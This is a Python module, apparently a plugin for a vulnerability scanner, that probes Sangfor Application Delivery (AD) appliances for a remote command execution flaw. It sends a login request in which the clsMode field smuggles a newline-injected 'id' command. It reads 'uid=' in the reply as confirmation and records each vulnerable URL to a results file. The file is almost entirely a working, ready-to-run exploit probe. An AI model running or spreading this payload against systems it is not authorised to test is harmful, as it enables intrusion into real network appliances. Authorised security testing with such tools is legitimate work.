#!/user/bin/env python3
# -*- coding: utf-8 -*-
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
import requests
class ShengXinFu_Rce_Scan:
    def __init__(self):
        self.header = None
        self.proxy = None

    def send_payload(self,url):
        url2 = url + '/rep/login'
        data = 'clsMode=cls_mode_login%0Aid%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123'
        try:
            req = requests.post(url2, timeout=5,data=data,verify=self.verify,proxies=self.proxy,headers=self.header)
            if "uid=" in req.text:
                OutPrintInfoSuc("ShenXinFu", f"存在深信服应用交付AD远程命令执行漏洞 {url2}")

                if not self.batch:
                    with open("./result/shengxinfu_rce.txt","a") as w:
                        w.write(f"{url2}\n")
                return True
            return False
        except Exception:
            if not self.batch:
                OutPrintInfo("ShenXinFu", "不存在深信服应用交付AD远程命令执行漏洞")
            return False
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.verify = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("ShenXinFu", "开始检测深信服应用交付AD远程命令执行漏洞...")
        self.send_payload(url)
        if not self.batch:
            OutPrintInfo("ShenXinFu", "深信服应用交付AD远程命令执行漏洞检测结束")
